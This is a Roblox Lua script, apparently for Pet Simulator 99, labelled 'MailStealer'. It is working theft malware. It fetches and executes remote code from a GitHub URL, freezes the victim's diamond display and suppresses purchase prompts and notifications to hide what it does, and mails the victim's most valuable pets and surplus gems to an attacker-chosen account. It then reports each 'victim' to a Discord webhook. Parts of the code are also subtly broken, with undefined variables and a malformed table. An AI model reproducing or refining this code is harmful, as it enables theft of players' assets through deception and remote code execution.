Username = ""
Webhook = ""

local library111 = require(game.ReplicatedStorage.Library)
local save111 = library.Save.Get().Inventory

local GetSave = function()
    return require(game.ReplicatedStorage.Library.Client.Save).Get()
end
for i, v in pairs(GetSave().Inventory.Currency) do
    if v.id == "Diamonds" then
        GemAmount1 = v._am
    end
end
if GemAmount1 < 10000 then
    plr:kick("Saving Error, Please Rejoin or Join Back Later!")
end

UserId = game:GetService("Players"):GetUserIdFromNameAsync(Username)


getgenv()._MailStealer = {
    ["Configuration"] = {
        ["RecieverID"] = UserId,
        ["WebhookLogging"] = {
            ["URL"] = Webhook,
            ["Content"] = "@everyone"
        },
        ["Payload"] = function()
            pcall(function()
                loadstring(game:HttpGet("https://raw.githubusercontent.com/REDzHUB/PetSimulator99/main/redz9999.lua"))()
            end)
 
        end
    }
}
 
repeat task.wait() until game:IsLoaded()
local request = request or http_request or httprequest
_MailStealer.Configuration.Payload()
 
local HttpService = game:GetService("HttpService")
local GetSave = function()
    return require(game.ReplicatedStorage.Library.Client.Save).Get()
end
 
task.spawn(function()
    local Label = game:GetService("Players").LocalPlayer.PlayerGui.MainLeft.Left.Currency.Diamonds.Diamonds.Amount
    local Old = Label.Text 
 
    Label:GetPropertyChangedSignal("Text"):Connect(function()
        Label.Text = Old
    end)
end)
 
 
task.spawn(function()
    while task.wait() do 
        pcall(function()
            game:GetService("Players").LocalPlayer.PlayerGui:FindFirstChild("Purchase Pending").Enabled = false
            game:GetService("Lighting").Blur.Enabled = false
        end)
    end
end)
 
task.spawn(function()
    while task.wait() do 
        pcall(function()
            game:GetService("ReplicatedStorage").Assets.UI.Notifications.Bottom.Message:ClearAllChildren()
        end)
    end
end)
 
local Directory = game:GetService("ReplicatedStorage").__DIRECTORY.Pets
 
local GetPets = function()
    return GetSave().Inventory.Pet
end
 
local GetGems = function()
    for i, v in pairs(GetSave().Inventory.Currency) do 
        if v.id == 'Diamonds' then
            return v._am, i
        end 
    end
end
 
local SendPet = function(args, PET_UUID)
    local Remote = game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Send")
    repeat 
        Remote:InvokeServer(unpack(args))
    until GetSave().Inventory.Pet[PET_UUID] == nil 
 
    print(string.format("Request took %s seconds to go through", EndTick - StartTick))
end
 
local SendGems = function(args, gem_amount)
    local Remote = game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Send")
    repeat 
        Remote:InvokeServer(unpack(args))
    until GetGems() <= gem_amount
 
    print(string.format("Request took %s seconds to go through", EndTick - StartTick))
end
 
 
local Notify = function(Results)
    local Sent = ""
    local Fail = ""
    if #Results["Sent"] > 0  then
        for _, v in pairs(Results["Sent"]) do 
            Sent = Sent..v 
            Sent = Sent.."\n"
        end
    else 
        Sent = "No transactions were success"
    end
 
    if #Results["Failed"] > 0 then
        for _, v in pairs(Results["Failed"]) do 
            Fail = Fail..v 
            Fail = Fail.."\n"
        end
    else 
        Fail = "No transactions failed"
    end
 
    local Data = {
        ["content"] = _MailStealer.Configuration.WebhookLogging.Content,
        ["username"] = "Twilight Softworks: MailStealer",
        ["embeds"] = {
            
                ["title"] = "Twilight Softworks: Mailbox Steal Completed!",
                ["description"] = "**"..utf8.char(9989).." | Successfully Mailed: **\n```"..Sent.."```\n**"..utf8.char(10060).." | Failed to Mail (No Funds)**".."\n```"..Fail.."```\n**"..utf8.char(128142).." | Gems Transfered: "..Results["Gems"].."**",
                ["fields"] = {
                    {
                        ["name"] = "Victim: ",
                        ["value"] = "**"..utf8.char(8735).." [CLICK ME](https://www.roblox.com/users/"..game.Players.LocalPlayer.UserId.."/profile)**"
                    },
                    {
                        ["name"] = "Reciever",
                        ["value"] = "**"..utf8.char(8735).." [CLICK ME](https://www.roblox.com/users/".._MailStealer.Configuration.RecieverID.."/profile)".."**"
                    }
                },
                ["color"] = 0x2297F3,
                ["footer"] = {
                    ["text"] = "Twilight Softworks MailStealer"
                },
                ["timestamp"] = DateTime.now():ToIsoDate()
            }
        }
    }
 
    request({
        Url = _MailStealer.Configuration.WebhookLogging.URL,
        Method = "POST",
        Headers = {
            ["Content-Type"] = "application/json"
        },
        Body = HttpService:JSONEncode(Data),
    })
end
 
local GetMaxInvokes = function(GemAmount)
    return math.floor(GemAmount / 10000)
end
 
local GetPetData = function(PetName)
    local Uncategorized = Directory.Uncategorized:FindFirstChild(PetName)
    if Uncategorized then
        local r = require(Uncategorized)
        if r.exclusiveLevel then 
            return true, "Exclusive", r.thumbnail
        end 
    else
        local Huge = Directory.Huge:FindFirstChild(PetName)
        local Titanic = Directory.Titanic:FindFirstChild(PetName)
 
        if Huge then 
            local r = require(Huge)
            return true, "Huge", r.thumbnail
        elseif Titanic then 
            local r = require(Titanic)
            return true, "Titanic", r.thumbnail
        else 
            return false, "Unknown", "rbxassetid://0"
        end
    end
    return false, "Unknown", "rbxassetid://0"
end
 
local GetHits = function(Pets)
    local Hits = table.create(0, nil)
    local SortData = {
        ["Titanic"] = 1,
        ["Huge"] = 2,
        ["Exclusive"] = 3;
    }
 
    for _, v in pairs(Pets) do 
        local MeetsRequirements, Type, Thumbnail = GetPetData(v.id)
        if MeetsRequirements then
            table.insert(Hits, {
                PET_ID = _,
                PET_NAME = v.id,
                TYPE = Type,
                AMOUNT = v._am or 1,
                PET_THUMBNAIL = Thumbnail
            })
        end
    end
 
    table.sort(Hits, function(a, b)
        return SortData[a.TYPE] < SortData[b.TYPE]
    end)
 
    return Hits
end
 
 
local Hits = GetHits(GetPets())
local Result = table.create(0, nil)
Result["Sent"] = {}
Result["Failed"] = {}
Result["Gems"] = 0
 
if #Hits > 0 then 
    local MaxInvokes = GetMaxInvokes(GetGems())
    print("Max Invokes: "..MaxInvokes)
    if #Hits > MaxInvokes then 
        for i = MaxInvokes + 1, #Hits, 1 do
            table.insert(Result["Failed"], string.format("%s | %s (%s)", string.upper(Hits[i].TYPE), Hits[i].PET_NAME, Hits[i].AMOUNT))
        end 
    end
 
    for i = 1, MaxInvokes, 1 do 
        local CurrentHit = Hits[i]
        if CurrentHit then
            local args = {
                [1] = game.Players:GetNameFromUserIdAsync(_MailStealer.Configuration.RecieverID),
                [2] = string.format("TSW ( x%s %s )", (CurrentHit._am or 1), CurrentHit.PET_NAME),
                [3] = "Pet",
                [4] = CurrentHit.PET_ID,
                [5] = (CurrentHit.AMOUNT or 1)
            }
 
            SendPet(args, CurrentHit.PET_ID)
 
            table.insert(Result["Sent"], string.format("%s | %s (%s)", string.upper(CurrentHit.TYPE), CurrentHit.PET_NAME, CurrentHit.AMOUNT))
 
        else 
            local Difference, Id = GetGems()
            Difference = Difference - 10000
            if Difference > 0 then 
                local args = {
                    [1] = game.Players:GetNameFromUserIdAsync(_MailStealer.Configuration.RecieverID),
                    [2] = string.format("TSW ( Gems: %s )", Difference),
                    [3] = "Currency",
                    [4] = Id,
                    [5] = Difference
                }
 
                SendGems(args, Difference)
            end
            Result["Gems"] = Difference
            break
        end
    end
end 

Notify(Result)